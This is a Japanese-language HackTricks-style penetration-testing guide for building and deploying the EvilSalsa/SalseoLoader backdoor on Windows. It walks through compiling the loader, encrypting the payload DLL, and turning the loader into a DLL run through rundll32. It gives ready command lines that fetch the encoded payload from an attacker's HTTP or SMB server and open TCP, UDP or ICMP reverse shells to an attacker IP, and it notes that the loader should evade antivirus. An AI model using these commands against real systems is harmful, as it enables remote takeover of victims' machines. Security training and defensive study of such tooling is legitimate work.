# Salseo

{{#include ../banners/hacktricks-training.md}}

## バイナリのコンパイル

GitHubからソースコードをダウンロードし、**EvilSalsa**と**SalseoLoader**をコンパイルします。コードをコンパイルするには**Visual Studio**がインストールされている必要があります。

使用するWindowsボックスのアーキテクチャに合わせてこれらのプロジェクトをコンパイルします（Windowsがx64をサポートしている場合は、そのアーキテクチャ用にコンパイルしてください）。

**Visual Studio**の**左側の「Build」タブ**の**「Platform Target」**で**アーキテクチャを選択**できます。

(\*\*このオプションが見つからない場合は、**「Project Tab」**を押してから**「\<Project Name> Properties」**を選択してください)

![](<../images/image (132).png>)

次に、両方のプロジェクトをビルドします（Build -> Build Solution）（ログ内に実行可能ファイルのパスが表示されます）：

![](<../images/image (1) (2) (1) (1) (1).png>)

## バックドアの準備

まず、**EvilSalsa.dll**をエンコードする必要があります。そのためには、Pythonスクリプト**encrypterassembly.py**を使用するか、プロジェクト**EncrypterAssembly**をコンパイルできます。

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### ウィンドウズ
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
わかりました、今すぐすべてのSalseoのことを実行するために必要なものがあります: **エンコードされたEvilDalsa.dll**と**SalseoLoaderのバイナリ**です。

**SalseoLoader.exeバイナリをマシンにアップロードします。どのAVにも検出されないはずです...**

## **バックドアを実行する**

### **TCPリバースシェルを取得する（HTTPを通じてエンコードされたdllをダウンロードする）**

ncをリバースシェルリスナーとして起動し、エンコードされたevilsalsaを提供するHTTPサーバーを起動することを忘れないでください。
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **UDPリバースシェルの取得（SMBを通じてエンコードされたdllをダウンロード）**

リバースシェルリスナーとしてncを起動し、エンコードされたevilsalsaを提供するためにSMBサーバーを起動することを忘れないでください。
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **ICMPリバースシェルの取得（被害者の中にエンコードされたdllが既に存在する）**

**今回は、リバースシェルを受信するためにクライアントに特別なツールが必要です。ダウンロードしてください:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP応答を無効にする:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### クライアントを実行する：
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### 被害者の内部で、salseoのことを実行しましょう:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## SalseoLoaderをDLLとしてコンパイルし、メイン関数をエクスポートする

Visual Studioを使用してSalseoLoaderプロジェクトを開きます。

### メイン関数の前に追加: \[DllExport]

![](<../images/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### このプロジェクトにDllExportをインストールする

#### **ツール** --> **NuGetパッケージマネージャー** --> **ソリューションのNuGetパッケージを管理...**

![](<../images/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **DllExportパッケージを検索（ブラウズタブを使用）、インストールを押す（ポップアップを受け入れる）**

![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

プロジェクトフォルダーに**DllExport.bat**と**DllExport_Configure.bat**のファイルが表示されます。

### **U**ninstall DllExport

**アンインストール**を押します（変ですが、信じてください、必要です）

![](<../images/image (5) (1) (1) (2) (1).png>)

### **Visual Studioを終了し、DllExport_configureを実行する**

ただ**終了**します

次に、**SalseoLoaderフォルダー**に移動し、**DllExport_Configure.bat**を実行します。

**x64**を選択します（x64ボックス内で使用する場合、私のケースです）、**System.Runtime.InteropServices**を選択します（**DllExportの名前空間内**）そして**適用**を押します。

![](<../images/image (7) (1) (1) (1) (1).png>)

### **Visual Studioでプロジェクトを再度開く**

**\[DllExport]**はもはやエラーとしてマークされていないはずです。

![](<../images/image (8) (1).png>)

### ソリューションをビルドする

**出力タイプ = クラスライブラリ**を選択します（プロジェクト --> SalseoLoaderプロパティ --> アプリケーション --> 出力タイプ = クラスライブラリ）

![](<../images/image (10) (1).png>)

**x64** **プラットフォーム**を選択します（プロジェクト --> SalseoLoaderプロパティ --> ビルド --> プラットフォームターゲット = x64）

![](<../images/image (9) (1) (1).png>)

ソリューションを**ビルド**するには: ビルド --> ソリューションのビルド（出力コンソール内に新しいDLLのパスが表示されます）

### 生成されたDllをテストする

テストしたい場所にDllをコピーして貼り付けます。

実行:
```
rundll32.exe SalseoLoader.dll,main
```
エラーが表示されない場合、おそらく機能するDLLがあります!!

## DLLを使用してシェルを取得する

**HTTP** **サーバー**を使用し、**nc** **リスナー**を設定することを忘れないでください。

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{{#include ../banners/hacktricks-training.md}}
